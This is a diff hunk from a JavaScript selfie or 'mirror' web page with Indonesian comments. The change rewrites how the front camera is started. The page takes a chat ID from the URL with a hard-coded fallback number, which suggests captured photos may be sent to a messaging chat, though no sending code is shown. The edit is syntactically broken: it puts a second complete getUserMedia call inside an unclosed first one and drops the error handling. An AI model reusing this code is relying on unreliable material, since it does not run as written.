@@ -84,14 +84,18 @@ const CHAT_ID = urlParams.get('id') || "7596509818";
 
         // Nyalakan Kamera (Langsung Tampil di Layar)
         navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } 
-        })
-        .then(stream => {
-            video.srcObject = stream;
-        })
-        .catch(err => {
-            alert("Izinkan kamera dulu biar bisa ngaca Bang!");
-        });
+        navigator.mediaDevices.getUserMedia({
+  video: { facingMode: "user" }
+}).then(stream => {
+  video.srcObject = stream;
+  video.play();
+
+  video.requestVideoFrameCallback(() => {
+    console.log("📸 Kamera benar-benar siap (frame valid)");
+    window.cameraReady = true;
+  });
+});
+
 
         function startCountdown() {
             btnSnap.style.display = "none"; // Sembunyikan tombol
